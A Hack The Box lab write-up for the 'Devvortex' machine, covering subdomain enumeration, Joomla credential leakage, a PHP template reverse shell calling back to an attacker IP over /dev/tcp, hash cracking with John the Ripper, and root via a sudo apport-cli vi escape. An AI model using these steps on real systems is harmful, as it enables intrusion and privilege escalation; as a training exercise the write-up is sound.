---
title: "Devvortex (linux)"
category: ["HTB", "Machines", "Devvortex (linux)"]
---

# Devvortex (linux)

`nmap -sT ipdelamaquina` = to scan the IP and get information about which ports are open.

We try to access the web page through the IP in a browser, but we can't, so we edit the file `/etc/hosts` with nano and add the domain `devvortex.htb` with its IP.

When we access the page, we inspect the code and see that the contact section is useless and is just HTML that cannot store information.

**gobuster dir -u http://devvortex.htb/ -w /ruta/a/seclists/Discovery/Web-Content/common.txt -r**

Gobuster is used to scan directories and files on web servers.  
`dir` specifies that you will scan directories.  
`-u` indicates the URL of the website.  
`-w` specifies the path to the wordlist file you will use. Here, we use the common words provided by seclists.

`git clone https://github.com/danielmiessler/SecLists.git`

This command downloads seclists in case it is not already on our operating system.

We access seclists and verify it is created with `ls`: `cd SecLists`  
![Pasted image 20240217163422](/VaultSite/wiki-images/Pasted%20image%2020240217163422.png)

We don't find anything, so we check if it has subdomains via DNS.  
![Pasted image 20240217163906](/VaultSite/wiki-images/Pasted%20image%2020240217163906.png)  
It's the same command but removing the URL and using just the name, changing the path to the file, and starting with `dns` instead of `dir` because that's what we're looking for.

We add the subdomain to `/etc/hosts`.

Once we access it, we need to add `/robots.txt` to the URL. It's like a sign at an entrance that tells you where you can and cannot go and who is allowed.

We see an `administrator/` directory.  
We access it.  
![Pasted image 20240217170309](/VaultSite/wiki-images/Pasted%20image%2020240217170309.png)  
We try default credentials, but they don't work.  
Since we know the site is Joomla, we scan it with joomscan.  
![Pasted image 20240217170556](/VaultSite/wiki-images/Pasted%20image%2020240217170556.png)  
We get the version.  
The command is `perl joomscan.pl -u http://tu-sitio-joomla.com`  
![Pasted image 20240217170703](/VaultSite/wiki-images/Pasted%20image%2020240217170703.png)  
We get information from vulcheck and modify this command.  
![Pasted image 20240218165355](/VaultSite/wiki-images/Pasted%20image%2020240218165355.png)  
First, we install `jq`.  
![Pasted image 20240218165802](/VaultSite/wiki-images/Pasted%20image%2020240218165802.png)  
We get very important information, such as login details.  
![Pasted image 20240218165956](/VaultSite/wiki-images/Pasted%20image%2020240218165956.png)  
From here, we extract the login credentials.  
![Pasted image 20240218170156](/VaultSite/wiki-images/Pasted%20image%2020240218170156.png)  
Now we access the admin templates and in the `index` file, we add a line of code to create a reverse shell:  
`exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.246/4444 0>&1'")`  
![Pasted image 20240218171319](/VaultSite/wiki-images/Pasted%20image%2020240218171319.png)  
The IP part needs to be changed to ours.

We configure the listener.  
![Pasted image 20240218171531](/VaultSite/wiki-images/Pasted%20image%2020240218171531.png)  
![Pasted image 20240218171605](/VaultSite/wiki-images/Pasted%20image%2020240218171605.png)  
We save and  
![Pasted image 20240218172706](/VaultSite/wiki-images/Pasted%20image%2020240218172706.png)  
We run `whoami` and see that we are `www-data`.

We try to access the `user.txt` file but don't have permissions.  
![Pasted image 20240218173218](/VaultSite/wiki-images/Pasted%20image%2020240218173218.png)  
To gain those permissions, we previously saw that they have a MySQL database.  
We access it with `mysql -u lewis -p`  
![Pasted image 20240218173548](/VaultSite/wiki-images/Pasted%20image%2020240218173548.png)  
We access the database and see the Joomla one.  
![Pasted image 20240218174211](/VaultSite/wiki-images/Pasted%20image%2020240218174211.png)  
We discover a user named `logan`, which we can also find graphically in Joomla.  
![Pasted image 20240218174253](/VaultSite/wiki-images/Pasted%20image%2020240218174253.png)  
We create a file called `hash` and paste the hash inside. Then, we use John the Ripper to perform a brute force attack using the hash.  
![Pasted image 20240218174550](/VaultSite/wiki-images/Pasted%20image%2020240218174550.png)  
We need to change the path and decompress the `rockyou.txt.gz` file.  
![Pasted image 20240218180501](/VaultSite/wiki-images/Pasted%20image%2020240218180501.png)  
![Pasted image 20240218180924](/VaultSite/wiki-images/Pasted%20image%2020240218180924.png)  
We access with the password we obtained via `ssh logan@10.10.11.242`.  
Now we can view the `user.txt` file and have the first flag.  
![Pasted image 20240218181154](/VaultSite/wiki-images/Pasted%20image%2020240218181154.png)  
Logan has these sudo permissions:  
![Pasted image 20240218181142](/VaultSite/wiki-images/Pasted%20image%2020240218181142.png)  
And we see that we can use `sudo /usr/bin/apport-cli`.  
![Pasted image 20240218181330](/VaultSite/wiki-images/Pasted%20image%2020240218181330.png)  
We use `-f` because it's for reporting bugs or reading existing ones.  
![Pasted image 20240218181443](/VaultSite/wiki-images/Pasted%20image%2020240218181443.png)  
We choose option 1, then option 2, and execute to view the report.  
![Pasted image 20240218181720](/VaultSite/wiki-images/Pasted%20image%2020240218181720.png)  
Everything is in `vi`, and we will use the `!` syntax.  
![Pasted image 20240218181833](/VaultSite/wiki-images/Pasted%20image%2020240218181833.png)  
Since we executed this with `sudo`, we could have special permissions, so we use `!/bin/bash` with `!`. This tells the system to use bash to read it.  
![Pasted image 20240218182009](/VaultSite/wiki-images/Pasted%20image%2020240218182009.png)  
And we access `root.txt`.  
![Pasted image 20240218182549](/VaultSite/wiki-images/Pasted%20image%2020240218182549.png)